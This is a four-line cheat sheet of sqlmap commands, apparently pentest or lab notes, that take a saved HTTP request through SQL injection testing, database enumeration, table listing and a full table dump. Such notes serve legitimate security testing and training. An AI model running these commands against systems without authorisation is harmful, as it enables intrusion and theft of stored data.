sqlmap -r request.req
sqlmap -r request.req --dbs
sqlmap -r request.req -D database_name --tables
sqlmap -r request.req -D database_name -T table_name --dump